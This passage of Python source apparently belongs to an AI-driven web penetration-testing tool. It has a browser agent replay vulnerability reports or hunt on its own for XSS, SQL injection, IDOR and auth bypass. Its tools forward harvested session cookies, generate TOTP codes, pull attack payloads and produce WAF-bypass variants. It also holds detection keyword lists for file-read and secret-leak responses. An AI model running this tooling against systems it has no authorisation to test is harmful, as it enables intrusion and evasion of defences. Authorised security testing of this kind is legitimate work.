                result="ERROR", confidence=0.0, evidence=f"Target unreachable: {e}",
                actions_taken=0, duration=time.time() - start, screenshots=[],
            )
        except httpx.TimeoutException:
            logger.error(f"  ❌ Target timed out: {target_url} (15s)")
            return ReplayReport(
                report_id=rid, title=parsed_report.title, target_url=target_url,
                result="ERROR", confidence=0.0, evidence="Target timed out after 15s",
                actions_taken=0, duration=time.time() - start, screenshots=[],
            )
        except Exception as e:
            logger.warning(f"  ⚠️  Target pre-check failed: {e} — proceeding anyway")
        if target_override:
            tgt = urllib.parse.urlparse(target_override)
            for step in parsed_report.steps:
                if step.url:
                    sp = urllib.parse.urlparse(step.url)
                    if sp.netloc and sp.netloc != tgt.netloc:
                        step.url = f"{target_override.rstrip('/')}{sp.path}" + \
                                   (f"?{sp.query}" if sp.query else "") + \
                                   (f"#{sp.fragment}" if sp.fragment else "")

        # Use enriched prompt if available (from ReportEnricher), else default
        if hasattr(self, '_enriched_prompt') and self._enriched_prompt:
            task = self._enriched_prompt
            logger.info("  🧪 Using enriched prompt from ReportEnricher")
            self._enriched_prompt = None  # Consume it (one-shot)
        elif self.blind:
            task = self._build_blind_prompt(parsed_report, target_url)
        else:
            task = self._build_replay_prompt(parsed_report, target_url)

        # Custom tools via Controller
        controller = Controller()

        @controller.action(description="Report a confirmed vulnerability finding. Call when you have evidence. Automatically captures a screenshot as proof.")
        async def report_vulnerability(vuln_type: str, evidence: str, confidence: float) -> str:
            findings.append({"vuln_type": vuln_type, "evidence": evidence, "confidence": confidence, "ts": time.time()})
            logger.info(f"  🚨 FINDING: {vuln_type} ({confidence:.0%}) — {evidence[:200]}")

            # Capture screenshot as evidence
            screenshot_data = None
            try:
                page = await browser.get_current_page()
                if page:
                    screenshot_path = self.evidence_dir / f"{rid}_vuln_{vuln_type}_{int(time.time())}.png"
                    # Playwright screenshot() returns bytes directly
                    screenshot_data = await page.screenshot(type='png', full_page=True)
                    screenshot_path.write_bytes(screenshot_data)
                    logger.info(f"  📸 Vulnerability screenshot saved: {screenshot_path.name}")
                    findings[-1]["screenshot"] = str(screenshot_path)
            except Exception as e:
                logger.debug(f"  Screenshot capture failed: {e}")

            # Log to evidence chain (don't let logging failure break the tool)
            try:
                evidence_chain.add_finding(
                    verdict="VULNERABLE" if confidence >= 0.7 else "NEEDS_MORE",
                    confidence=confidence,
                    evidence_text=f"[{vuln_type}] {evidence}",
                )
                if screenshot_data:
                    evidence_chain.add_screenshot(screenshot_data, f"Vulnerability proof: {vuln_type}")
            except Exception:
                pass

            return f"Logged: {vuln_type} ({confidence:.0%}). Screenshot captured as evidence."

        agent_notes = {}

        @controller.action(description="Save a note for later (credentials, tokens, important values). Use key like 'email', 'password', 'token'.")
        def save_note(key: str, value: str) -> str:
            agent_notes[key] = value
            logger.info(f"  📝 Note: {key} = {value}")
            return f"Saved: {key} = {value}"

        @controller.action(description="Recall a previously saved note by key.")
        def get_note(key: str) -> str:
            val = agent_notes.get(key, "NOT FOUND")
            return f"{key} = {val}"

        @controller.action(description="Generate a 6-digit TOTP code for 2FA authentication. Pass the base32 secret.")
        def generate_totp(secret: str) -> str:
            """Generate TOTP code for 2FA."""
            try:
                from src.auth.totp import get_totp_with_expiry, validate_totp_secret
                if not validate_totp_secret(secret):
                    return "Error: Invalid base32 secret"
                code, expires = get_totp_with_expiry(secret)
                logger.info(f"  🔐 TOTP: {code} (expires in {expires}s)")
                return f"TOTP code: {code} (expires in {expires} seconds)"
            except Exception as e:
                return f"Error generating TOTP: {e}"

        @controller.action(description=(
            "Make an HTTP request (inherits browser cookies/JWT). "
            "Returns JSON with status and body. Use for API testing, privilege checks, "
            "and verifying vulnerabilities. Like Burp Repeater. "
            "Pass body as a JSON object, e.g. body={\"email\":\"test@test.com\",\"role\":\"admin\"}"
        ))
        async def make_request(url: str, method: str = "GET", headers: dict = {}, body: dict = {}) -> str:
            """Make HTTP request using Python httpx — grabs cookies from browser context."""
            import httpx
            try:
                # Resolve relative URLs against target
                if url.startswith("/"):
                    url = target_url.rstrip("/") + url

                # Grab cookies from browser context
                cookie_jar = {}
                try:
                    page = await browser.get_current_page()
                    if page:
                        cookies = await page.context.cookies()
                        for c in cookies:
                            cookie_jar[c["name"]] = c["value"]
                except Exception:
                    pass  # proceed without cookies

                # Normalize headers
                req_headers = {"Content-Type": "application/json"}
                if isinstance(headers, dict):
                    req_headers.update(headers)

                # Normalize body
                if isinstance(body, dict) and body:
                    body_str = json.dumps(body)
                elif isinstance(body, str) and body:
                    body_str = body
                else:
                    body_str = None

                async with httpx.AsyncClient(cookies=cookie_jar, verify=False, timeout=15) as client:
                    resp = await client.request(
                        method=method, url=url, headers=req_headers, content=body_str
                    )

                # Inject response cookies back into browser context
                try:
                    if resp.cookies:
                        page = await browser.get_current_page()
                        if page:
                            for name, value in resp.cookies.items():
                                domain = urllib.parse.urlparse(url).hostname or "localhost"
                                await page.context.add_cookies([{
                                    "name": name, "value": value, "domain": domain, "path": "/",
                                }])
                    # If response contains a JWT token, extract and inject as cookie
                    try:
                        resp_data = json.loads(resp.text)
                        token = resp_data.get("token") or resp_data.get("authentication", {}).get("token")
                        if token:
                            page = await browser.get_current_page()
                            if page:
                                domain = urllib.parse.urlparse(url).hostname or "localhost"
                                await page.context.add_cookies([{
                                    "name": "token", "value": token, "domain": domain, "path": "/",
                                }])
                                logger.info(f"  🔑 Injected auth token from API response")
                    except (json.JSONDecodeError, AttributeError):
                        pass
                except Exception:
                    pass

                result = json.dumps({
                    "status": resp.status_code,
                    "statusText": resp.reason_phrase,
                    "url": str(resp.url),
                    "body": resp.text[:2000],
                })
                logger.info(f"  📡 {method} {url} → {resp.status_code} ({len(resp.text)} bytes)")

                # Add human-readable summary
                summary_parts = [f"HTTP {resp.status_code}"]
                try:
                    resp_data = json.loads(resp.text)
                    if isinstance(resp_data, dict):
                        if "data" in resp_data and isinstance(resp_data["data"], dict):
                            d = resp_data["data"]
                            if "email" in d: summary_parts.append(f"email={d['email']}")
                            if "role" in d: summary_parts.append(f"role={d['role']}")
                            if "id" in d: summary_parts.append(f"id={d['id']}")
                        if "token" in resp_data or "authentication" in resp_data:
                            summary_parts.append("TOKEN_RECEIVED")
                except Exception:
                    pass
                result_with_summary = result + f"\n\n⚡ SUMMARY: {' | '.join(summary_parts)}"
                if any(kw in result.lower() for kw in ['"role":"admin"', '"role": "admin"', "admin"]):
                    result_with_summary += "\n🚨 ADMIN ROLE DETECTED — this confirms privilege escalation. Call report_vulnerability NOW."

                # Log to evidence chain (don't let logging failure break the tool)
                try:
                    evidence_chain.add_request(
                        method=method, url=url, body=body_str or "",
                        status=resp.status_code, response=resp.text[:2000],
                        description=f"{method} {url} → {resp.status_code}",
                    )
                except Exception:
                    pass

                return result_with_summary
            except Exception as e:
                logger.error(f"  ❌ make_request error: {e}")
                return f"ERROR: {e}"

        @controller.action(description=(
            "Analyze an HTTP response for vulnerability indicators. "
            "Pass the response text from make_request and the vulnerability type being tested. "
            "Returns analysis with clear verdict: VULNERABLE, NEEDS_MORE_TESTING, or NOT_VULNERABLE."
        ))
        def check_response(response_text: str, vuln_type: str) -> str:
            """Analyze an API/HTTP response for vulnerability indicators."""
            response_lower = response_text.lower()
            indicators = []
            verdict = "NEEDS_MORE_TESTING"

            # Privilege escalation indicators
            if vuln_type in ("privilege_escalation", "auth_bypass", "broken_access_control"):
                if any(kw in response_lower for kw in ['"role":"admin"', '"role": "admin"', '"isadmin":true', '"isadmin": true']):
                    indicators.append("🚨 ADMIN ROLE in response — privilege escalation CONFIRMED")
                    verdict = "VULNERABLE"
                if any(kw in response_lower for kw in ['"token":', '"jwt":', '"authentication":', '"access_token":']):
                    indicators.append("🔑 Auth token in response — check if it grants elevated access")
                if '"status":201' in response_lower or '"status": 201' in response_lower:
                    indicators.append("✅ Resource created (201) — check if it has elevated privileges")
                if any(kw in response_lower for kw in ['403', 'forbidden', 'unauthorized', 'access denied']):
                    indicators.append("🔒 Access denied — endpoint is protected, try different auth")
                    verdict = "NOT_VULNERABLE" if "403" in response_text else verdict

            # XSS indicators
            elif "xss" in vuln_type:
                if any(kw in response_lower for kw in ['<script', 'onerror=', 'javascript:', 'alert(']):
                    indicators.append("🚨 XSS payload reflected in response — XSS CONFIRMED")
                    verdict = "VULNERABLE"
                if any(kw in response_lower for kw in ['&lt;script', '&lt;img', 'sanitized', 'escaped']):
                    indicators.append("🛡️ Payload appears escaped/sanitized — try bypass variants")

            # SQLi indicators
            elif vuln_type == "sqli":
                if any(kw in response_lower for kw in ['sql syntax', 'mysql', 'sqlite', 'postgresql', 'ora-', 'unclosed quotation']):
                    indicators.append("🚨 SQL error in response — SQLi CONFIRMED")
                    verdict = "VULNERABLE"
                if any(kw in response_lower for kw in ['"token":', '"authentication":', 'login successful', 'welcome']):
                    indicators.append("🚨 Auth bypass successful — SQLi CONFIRMED")
                    verdict = "VULNERABLE"
                if 'invalid' in response_lower and ('email' in response_lower or 'password' in response_lower):
                    indicators.append("❌ Login failed — try different SQLi payload")

            # IDOR indicators
            elif vuln_type == "idor":
                if any(kw in response_lower for kw in ['"email":', '"username":', '"password":', '"address":']):
                    indicators.append("🚨 Other user's data exposed — IDOR CONFIRMED")
                    verdict = "VULNERABLE"
                if '401' in response_text or '403' in response_text:
                    indicators.append("🔒 Access control working — endpoint protected")
                    verdict = "NOT_VULNERABLE"

            # Info disclosure indicators
            elif vuln_type == "info_disclosure":
                if any(kw in response_lower for kw in ['"password":', '"secret":', '"api_key":', '"token":', 'creditcard']):
                    indicators.append("🚨 Sensitive data exposed — Info Disclosure CONFIRMED")
                    verdict = "VULNERABLE"
                if len(response_text) > 500 and any(kw in response_lower for kw in ['"email":', '"users":', '"data":']):
                    indicators.append("⚠️ Large data response with user info — likely vulnerable")
                    verdict = "VULNERABLE"

            # Path traversal indicators
            elif vuln_type == "path_traversal":
                if any(kw in response_lower for kw in ['root:', '/bin/bash', '[extensions]', 'win.ini', '<?php']):
                    indicators.append("🚨 File contents from outside web root — Path Traversal CONFIRMED")
                    verdict = "VULNERABLE"

            # Open redirect indicators
            elif vuln_type == "open_redirect":
                if any(kw in response_lower for kw in ['location:', 'redirect', '302', '301']):
                    indicators.append("⚠️ Redirect detected — check if it goes to external domain")

            # CSRF token detection (useful for any vuln type)
            csrf_match = re.search(r'csrf[_-]?token["\s:=]+["\']?([a-zA-Z0-9_-]{20,})', response_text, re.IGNORECASE)
            if csrf_match:
                token = csrf_match.group(1)
                indicators.append(f"🔑 CSRF token found: {token[:30]}... — save with save_note('csrf_token', '{token}')")

            if not indicators:
                indicators.append("No obvious vulnerability indicators found in response")

            result = f"## Analysis ({verdict})\n"
            for ind in indicators:
                result += f"- {ind}\n"

            if verdict == "VULNERABLE":
                result += "\n⚡ ACTION: Call report_vulnerability NOW with the evidence above."
            elif verdict == "NEEDS_MORE_TESTING":
                result += "\n⚡ ACTION: Continue testing — try next step or different payload."
            else:
                result += "\n⚡ ACTION: This approach didn't work. Try a different strategy."

            logger.info(f"  🔍 check_response: {verdict} ({len(indicators)} indicators)")
            return result

        @controller.action(description=(
            "Automatically log into the application using the configured auth profile. "
            "Handles CSRF tokens, multi-step login forms, and cookie injection. "
            "Call this instead of manually filling login forms — it's faster and more reliable. "
            "Returns the auth status and any tokens/cookies obtained."
        ))
        async def auto_login() -> str:
            """Auto-login using pre-configured auth or by filling the login form programmatically."""
            try:
                page = await browser.get_current_page()
                if not page:
                    return "ERROR: No active page"

                # Check if we already have auth cookies
                cookies = await page.context.cookies()
                auth_cookies = [c for c in cookies if c["name"].lower() in ("token", "jwt", "session", "sessionid", "connect.sid", "phpsessid")]
                if auth_cookies:
                    cookie_names = [c["name"] for c in auth_cookies]
                    return f"Already authenticated. Auth cookies present: {', '.join(cookie_names)}"

                # Try to authenticate via auth_manager and inject cookies
                if auth_session and auth_session.cookies:
                    domain = urllib.parse.urlparse(target_url).hostname or "localhost"
                    for name, value in auth_session.cookies.items():
                        await page.context.add_cookies([{
                            "name": name, "value": value, "domain": domain, "path": "/",
                        }])
                    if auth_session.authorization:
                        # Also store the token for API calls
                        await page.context.add_cookies([{
                            "name": "token", "value": auth_session.authorization.replace("Bearer ", ""),
                            "domain": domain, "path": "/",
                        }])
                    logger.info(f"  🔑 auto_login: injected {len(auth_session.cookies)} cookies from auth profile")

                    # Reload page to pick up new cookies
                    await page.reload()
                    await page.wait_for_load_state("domcontentloaded")

                    return (
                        f"✅ Logged in via auth profile '{auth_session.profile_name}'. "
                        f"Injected {len(auth_session.cookies)} cookies. "
                        f"{'Token: ' + auth_session.authorization[:30] + '...' if auth_session.authorization else 'No JWT token.'} "
                        f"Page reloaded — you should now have authenticated access."
                    )
                else:
                    return (
                        "⚠️ No auth profile configured for this target. "
                        "You'll need to login manually through the browser. "
                        "Try: 1) Navigate to login page, 2) Fill email/password, 3) Press Enter"
                    )
            except Exception as e:
                logger.error(f"  ❌ auto_login error: {e}")
                return f"ERROR: {e}"

        @controller.action(description=(
            "Capture the current page's HTML source as evidence. "
            "Use before and after payload injection to show the vulnerability. "
            "Returns first 3000 chars of the HTML."
        ))
        async def capture_dom() -> str:
            """Capture current page HTML for evidence."""
            try:
                page = await browser.get_current_page()
                if not page:
                    return "ERROR: No active page"
                # Use JavaScript to get HTML since browser-use Page doesn't have content()
                html = await page.evaluate("document.documentElement.outerHTML")
                if not html:
                    return "ERROR: Could not retrieve page HTML"
                # Save full HTML to file
                dom_path = self.evidence_dir / f"{rid}_dom_{int(time.time())}.html"
                dom_path.write_text(html, encoding="utf-8")
                logger.info(f"  📄 DOM captured: {dom_path.name} ({len(html)} bytes)")
                # Log to evidence chain (don't let logging failure break the tool)
                try:
                    evidence_chain.add_dom(html, f"DOM capture ({len(html)} bytes)")
                except Exception:
                    pass
                return f"DOM saved ({len(html)} bytes). Preview:\n{html[:3000]}"
            except Exception as e:
                logger.error(f"  ❌ capture_dom error: {e}")
                return f"ERROR: {e}"

        @controller.action(description="Get curated payloads for a vulnerability type. Use these instead of inventing your own. Types: xss_reflected, xss_stored, sqli, path_traversal, idor, open_redirect")
        def get_payloads(vuln_type: str, limit: int = 10) -> str:
            payloads = self.payload_library.get_payloads(vuln_type, limit)
            if not payloads:
                return f"No curated payloads available for '{vuln_type}'"
            result = f"Payloads for {vuln_type} ({len(payloads)}):\n"
            for i, p in enumerate(payloads, 1):
                result += f"  {i}. {p}\n"
            return result

        # ── Register WAF Bypass tools ────────────────────────────────
        waf_bypass_key = self.groq_api_key or self.api_key
        if waf_bypass_key:
            waf_bypass = BrowserWAFBypass(
                api_key=waf_bypass_key,
                provider="groq" if self.groq_api_key else self.provider,
                verbose=self.verbose,
            )
            # Note: browser not yet created — we register tools with a lambda
            # that captures the variable. browser will be assigned before agent.run()
            _waf_browser_ref = [None]  # mutable ref to be set after browser creation

            @controller.action(description=(
                "Generate WAF/filter bypass variants for a blocked payload. "
                "Use when your payload was stripped, escaped, or returned 403. "
                "Returns bypass variants with encoding tricks, tag alternatives, and evasion strategies."
            ))
            async def mutate_payload(payload: str, context: str = "") -> str:
                variants = await waf_bypass.mutate_payload(payload, vuln_key, context)
                if not variants:
                    return "No variants generated. Try a completely different approach."
                result = f"## {len(variants)} Bypass Variants\n"
                for idx, v in enumerate(variants, 1):
                    result += f"\n{idx}. **{v['strategy']}**: `{v['payload']}`\n   Rationale: {v['rationale']}\n"
                result += "\nTry each variant. Use make_request to test via HTTP, or type into browser forms."
                try:
                    evidence_chain.add_link("waf_bypass", f"Generated {len(variants)} bypass variants for: {payload[:80]}")
                except Exception:
                    pass
                return result

            @controller.action(description=(
                "Test a bypass payload via HTTP request. Use after mutate_payload gives you variants. "
                "Returns a clear blocked/not-blocked verdict."
            ))
            async def test_bypass(payload: str, url: str = "", method: str = "GET",
                                  headers: dict = {}, body: dict = {}) -> str:
                import httpx as _httpx
                request_url = url if url else target_url
                if request_url.startswith("/"):
                    request_url = target_url.rstrip("/") + request_url
                req_headers = dict(headers) if headers else {"Content-Type": "application/json"}
                cookie_jar = {}
                try:
                    if _waf_browser_ref[0]:
                        page = await _waf_browser_ref[0].get_current_page()
                        if page:
                            for c in await page.context.cookies():
                                cookie_jar[c["name"]] = c["value"]
                except Exception:
                    pass
                try:
                    async with _httpx.AsyncClient(cookies=cookie_jar, verify=False, timeout=15) as client:
                        body_str = json.dumps(body) if body else None
                        resp = await client.request(method=method, url=request_url,
                                                     headers=req_headers, content=body_str)
                    from src.engine.mutation_engine import MutationEngine as _ME
                    blocked = _ME.heuristic_block_detected(payload, resp.status_code, resp.text)
                    try:
                        if blocked:
                            evidence_chain.add_request(method, request_url, body_str or "", resp.status_code,
                                                        resp.text[:500], description=f"Bypass BLOCKED: {payload[:60]}")
                        else:
                            evidence_chain.add_request(method, request_url, body_str or "", resp.status_code,
                                                        resp.text[:500], description=f"Bypass SUCCESS: {payload[:60]}")
                    except Exception:
                        pass
                    if blocked:
                        return (f"❌ **BLOCKED** (HTTP {resp.status_code})\n"
                                f"Payload `{payload[:80]}` was blocked/filtered.\n"
                                f"Response: {resp.text[:300]}\nTry next variant.")
                    else:
                        return (f"✅ **NOT BLOCKED** (HTTP {resp.status_code})\n"
                                f"Payload `{payload[:80]}` passed the filter!\n"
                                f"Response: {resp.text[:300]}\nUse this payload to confirm the vuln.")
                except Exception as e:
                    return f"❌ Request failed: {e}"

            logger.info("  🛡️  WAF bypass tools registered (mutate_payload, test_bypass)")
        else:
            _waf_browser_ref = [None]

        # ── Register Vuln Chain tools ────────────────────────────────
        create_chain_tools(controller, vuln_chain)
        logger.info(f"  🔗 Vuln chain registered: {vuln_chain.summary}")

        # Auth: pre-authenticate and pass cookies via storage_state
        auth_session = self._get_auth_session(target_url)
        storage_state = None
        if auth_session and auth_session.cookies:
            domain = urllib.parse.urlparse(target_url).hostname or "localhost"
            storage_state = {
                "cookies": [
                    {"name": k, "value": v, "domain": domain, "path": "/", "httpOnly": False, "secure": False}
                    for k, v in auth_session.cookies.items()
                ],
                "origins": [],
            }
            auth_evidence = AuthEvidence(
                profile_name=auth_session.profile_name, auth_type=auth_session.auth_type.value,
                success=auth_session.success, log=auth_session.log, timestamp=datetime.now(),
            )
            logger.info(f"  🔑 Auth: {auth_session.profile_name} ({len(auth_session.cookies)} cookies)")

        # Start display stack for headed mode
        display_mgr = None
        if not self.headless:
            display_mgr = DisplayManager()
            if not display_mgr.start():
                logger.error("  ❌ Failed to start display stack for headed mode")
                return ReplayReport(
                    report_id=rid, title=parsed_report.title, target_url=target_url,
                    result="ERROR", confidence=0.0, evidence="Display stack failed to start",
                    actions_taken=0, duration=time.time() - start, screenshots=[],
                )
        else:
            # Even in headless mode, clean chrome locks
            DisplayManager()._clean_chrome_locks()

        if self.use_cloud:
            browser = Browser(
                headless=self.headless, disable_security=True, storage_state=storage_state,
                use_cloud=True,
            )
            logger.info("  ☁️  Using Browser-Use Cloud")
        else:
            # Chrome profile with password manager disabled via Preferences file
            chrome_profile = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))), 'chrome_profile')
            browser = Browser(
                headless=self.headless, disable_security=True, storage_state=storage_state,
                executable_path='/usr/bin/google-chrome-stable',
                user_data_dir=chrome_profile,
                args=DEFAULT_CHROME_ARGS + ['--disable-gpu', '--disable-dev-shm-usage', '--disable-popup-blocking'],
            )

        # Network interceptor will be installed after agent run via page.evaluate()

        # Set WAF bypass browser reference now that browser exists
        _waf_browser_ref[0] = browser

        # Append resume context from previous attempts (multi-attempt mode)
        if resume_context:
            task += f"\n\n## PREVIOUS ATTEMPT\n{resume_context}\n" \
                    "Learn from the previous attempt. Try different approaches, " \
                    "payloads, or pages. Do NOT repeat the same failed actions.\n"

        # Append vuln chain context only in blind mode (guided mode has explicit steps already)
        if self.blind:
            chain_context = vuln_chain.to_prompt_context()
            if chain_context:
                task += f"\n\n## EXPLOIT CHAIN\n{chain_context}\n" \
                        "Use the `checkpoint` tool after completing each step.\n" \
                        "Use `chain_status` to see your progress.\n"

        agent = Agent(task=task, llm=self._create_llm(), browser=browser, controller=controller, max_actions_per_step=5)

        try:
            # Run agent (browser-use handles browser launch internally)
            logger.info(f"  ▶️  Running agent (max {max_actions} steps)...")
            history = await agent.run(max_steps=max_actions)
            logger.info(f"  ✅ Done — {len(findings)} finding(s)")

            # Estimate browser-use agent cost from step count
            try:
                from src.cost_tracker import get_cost_tracker
                action_results = list(history.action_results()) if history else []
                step_count = len(action_results)
                if step_count > 0:
                    # Map provider to model name for pricing
                    browser_model = self.model if self.model else "claude-sonnet-4-0"
                    get_cost_tracker().record_browser_steps(step_count, browser_model)
                    logger.info(f"  💰 Browser cost estimated for {step_count} steps")
            except Exception as e:
                logger.debug(f"  Cost estimation skipped: {e}")

            # Save all screenshots as numbered frames for evidence
            try:
                screenshots = history.screenshots() or []
                for i, data in enumerate(screenshots):
                    path = self.evidence_dir / f"{rid}_step{i+1}.png"
                    path.write_bytes(data)
                if screenshots:
                    logger.info(f"  🎬 Saved {len(screenshots)} step screenshots for evidence")
            except Exception:
                pass

            # Install interceptor on all pages and harvest events
            network_events = []
            try:
                page = await browser.get_current_page()
                if page:
                    # Install interceptor now and evaluate
                    await page.evaluate(NETWORK_INTERCEPTOR_JS)
                    # Small wait for any pending events
                    import asyncio as _aio
                    await _aio.sleep(0.5)
                    evts = await page.evaluate("() => window.__resurface ? window.__resurface.events : []")
                    if evts:
                        network_events.extend(evts)
            except Exception:
                pass

            # Collect evidence
            evidence_list = self._collect_evidence(history, rid)

            # Check for JS dialogs (alert/confirm/prompt) — strong XSS indicator
            # browser-use stores auto-closed dialog messages in session._closed_popup_messages
            try:
                popup_msgs = getattr(browser, '_closed_popup_messages', [])
                if popup_msgs:
                    for msg in popup_msgs:
                        dialogs.append(f"JS dialog: {msg}")
                        logger.info(f"  🔔 Dialog detected: {msg}")
            except Exception:
                pass
            # Also check action results for dialog keywords
            try:
                for result in history.action_results():
                    result_str = str(result).lower() if result else ""
                    if any(kw in result_str for kw in ["alert", "dialog", "confirm", "prompt"]):
                        dialogs.append(f"dialog in action: {str(result)[:200]}")
            except Exception:
                pass
            # Check history model_actions for dialog mentions in eval/memory
            try:
                for action in history.model_actions():
                    action_str = str(action).lower()
                    if any(kw in action_str for kw in ["alert dialog", "javascript alert", "xss dialog", "alert('xss"]):
                        dialogs.append(f"dialog mentioned by agent: {str(action)[:200]}")
                        break  # One is enough
            except Exception:
                pass

            result, confidence, analysis = self._determine_result(
                parsed_report, findings, dialogs, network_events, evidence_list
            )
            dur = time.time() - start
            logger.info(f"  📋 Result: {result.value} ({confidence:.0%}) in {dur:.1f}s")

            # Finalize evidence chain
            evidence_chain.set_final_verdict(result.value.upper(), confidence)
            try:
                chain_json = evidence_chain.save_json()
                chain_html = evidence_chain.save_html()
                logger.info(f"  📋 Evidence chain saved: {chain_json}")
                logger.info(f"  📋 Evidence report: {chain_html}")
            except Exception as ec:
                logger.debug(f"  Evidence chain save error: {ec}")

            # Add chain summary to analysis
            analysis += f"\n\nEvidence chain: {evidence_chain.summary}"
            analysis += f"\nVuln chain: {vuln_chain.progress_bar}"

            return ReplayReport(
                report_id=rid, parsed_report=parsed_report, result=result,
                confidence=confidence, evidence=evidence_list, auth_evidence=auth_evidence,
                llm_analysis=analysis, replayed_at=datetime.now(),
                duration_seconds=dur, target_url=target_url,
            )

        except Exception as e:
            logger.error(f"  ❌ Replay error: {e}")
            return ReplayReport(
                report_id=rid, parsed_report=parsed_report, result=ReplayResult.ERROR,
                confidence=0.0, evidence=[], auth_evidence=auth_evidence,
                replayed_at=datetime.now(), duration_seconds=time.time() - start,
                target_url=target_url, error_message=str(e),
            )
        finally:
            try: await browser.stop()
            except Exception: pass
            if display_mgr:
                display_mgr.stop()

    async def _async_hunt(self, target_url: str, vuln_types: list[str] = None, max_actions: int = 30, stop_on_find: bool = False) -> dict:
        """Async hunt: autonomous vulnerability discovery without a report."""
        from browser_use import Agent, Browser
        from browser_use.controller import Controller
        import httpx

        vuln_types = vuln_types or ["xss", "sqli", "idor", "auth_bypass", "info_disclosure"]
        start = time.time()
        findings, dialogs, screenshots = [], [], []

        # Pre-flight: check if target is alive
        try:
            async with httpx.AsyncClient(timeout=15, verify=False, follow_redirects=True) as client:
                resp = await client.get(target_url)
                logger.info(f"🌐 Target alive: {target_url} (HTTP {resp.status_code})")
        except httpx.ConnectError as e:
            logger.error(f"❌ Target unreachable: {target_url} — {e}")
            return {"findings": [], "actions_taken": 0, "duration": time.time() - start, "screenshots": [], "dialogs": [], "error": f"Target unreachable: {e}"}
        except httpx.TimeoutException:
            logger.error(f"❌ Target timed out: {target_url} (15s)")
            return {"findings": [], "actions_taken": 0, "duration": time.time() - start, "screenshots": [], "dialogs": [], "error": "Target timed out after 15s"}
        except Exception as e:
            logger.warning(f"⚠️  Target pre-check failed: {e} — proceeding anyway")

        logger.info(f"🔍 HUNT — {target_url} | types: {', '.join(vuln_types)} | max: {max_actions}")

        # Start display stack for headed mode
        display_mgr = None
        if not self.headless:
            display_mgr = DisplayManager()
            if not display_mgr.start():
                logger.error("❌ Failed to start display stack for headed mode")
                return {
                    "findings": [], "actions_taken": 0, "duration": time.time() - start,
                    "screenshots": [], "dialogs": [], "error": "Display stack failed to start",
                    "target_url": target_url, "vuln_types": vuln_types,
                    "timestamp": datetime.now().isoformat(),
                }
        else:
            # Even in headless mode, clean chrome locks
            DisplayManager()._clean_chrome_locks()

        controller = Controller()

        @controller.action(description="Report a discovered vulnerability with type, evidence, and confidence (0-1).")
        def report_vulnerability(vuln_type: str, evidence: str, confidence: float) -> str:
            findings.append({"vuln_type": vuln_type, "evidence": evidence, "confidence": confidence, "ts": time.time()})
            logger.info(f"  🚨 HUNT: {vuln_type} ({confidence:.0%}) — {evidence[:200]}")
            if stop_on_find:
                return f"Logged: {vuln_type}. VULNERABILITY CONFIRMED — task complete. Stop testing and call done()."
            return f"Logged: {vuln_type}"

        # Auth via storage_state
        auth_session = self._get_auth_session(target_url)
        storage_state = None
        if auth_session and auth_session.cookies:
            domain = urllib.parse.urlparse(target_url).hostname or "localhost"
            storage_state = {
                "cookies": [
                    {"name": k, "value": v, "domain": domain, "path": "/", "httpOnly": False, "secure": False}
                    for k, v in auth_session.cookies.items()
                ],
                "origins": [],
            }
            logger.info(f"  🔑 Hunt auth: {auth_session.profile_name}")

        if self.use_cloud:
            browser = Browser(
                headless=self.headless, disable_security=True, storage_state=storage_state,
                use_cloud=True,
            )
        else:
            chrome_profile = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))), 'chrome_profile')
            browser = Browser(
                headless=self.headless, disable_security=True, storage_state=storage_state,
                executable_path='/usr/bin/google-chrome-stable',
                user_data_dir=chrome_profile,
                args=DEFAULT_CHROME_ARGS + ['--disable-gpu', '--disable-dev-shm-usage', '--disable-popup-blocking'],
            )
        task_prompt = self._build_hunt_prompt(target_url, vuln_types, stop_on_find=stop_on_find)
        agent = Agent(
            task=task_prompt,
            llm=self._create_llm(), browser=browser, controller=controller, max_actions_per_step=5,
        )

        try:
            history = await agent.run(max_steps=max_actions)

            # Save screenshots
            try:
                for i, data in enumerate(history.screenshots() or []):
                    p = self.evidence_dir / f"hunt_{int(time.time())}_{i}.png"
                    p.write_bytes(data)
                    screenshots.append(str(p))
            except Exception:
                pass

            # Dialog-based XSS finding
            if dialogs and not any(f["vuln_type"].lower().startswith("xss") for f in findings):
                findings.append({"vuln_type": "xss", "evidence": f"JS dialogs: {'; '.join(dialogs[:3])}", "confidence": 0.9, "ts": time.time()})

            dur = time.time() - start
            logger.info(f"🔍 Hunt done — {len(findings)} finding(s) in {dur:.1f}s")
            return {
                "findings": findings, "actions_taken": max_actions, "duration": dur,
                "screenshots": screenshots, "dialogs": dialogs,
                "prompt": task_prompt, "target_url": target_url,
                "vuln_types": vuln_types, "model": self.model, "provider": self.provider,
                "stop_on_find": stop_on_find, "timestamp": datetime.now().isoformat(),
            }

        except Exception as e:
            logger.error(f"  ❌ Hunt error: {e}")
            return {
                "findings": findings, "actions_taken": 0, "duration": time.time() - start,
                "screenshots": screenshots, "dialogs": dialogs, "error": str(e),
                "prompt": task_prompt, "target_url": target_url,
                "vuln_types": vuln_types, "model": self.model, "provider": self.provider,
                "stop_on_find": stop_on_find, "timestamp": datetime.now().isoformat(),
            }
        finally:
            try: await browser.stop()
            except Exception: pass
            if display_mgr:
                display_mgr.stop()

    # ── Public Sync API ──────────────────────────────────────────────

    @staticmethod
    def _run_async(coro):
        """Run an async coroutine from sync context, handling nested loops."""
        try:
            loop = asyncio.get_running_loop()
        except RuntimeError:
            loop = None
        if loop and loop.is_running():
            import concurrent.futures
            with concurrent.futures.ThreadPoolExecutor() as pool:
                return pool.submit(asyncio.run, coro).result()
        return asyncio.run(coro)

    def replay(self, parsed_report: ParsedReport, target_override: str = None, max_actions: int = None, resume_context: str = None) -> ReplayReport:
        """
        Replay a parsed vulnerability report using browser-use.
        Sync wrapper for CLI compatibility.
        """
        return self._run_async(self._async_replay(parsed_report, target_override, max_actions, resume_context=resume_context))

    def hunt(self, target_url: str, vuln_types: list[str] = None, max_actions: int = 30, stop_on_find: bool = False) -> dict:
        """
        Autonomously explore a web app and discover vulnerabilities.
        Sync wrapper for CLI compatibility.
        """
        return self._run_async(self._async_hunt(target_url, vuln_types, max_actions, stop_on_find=stop_on_find))
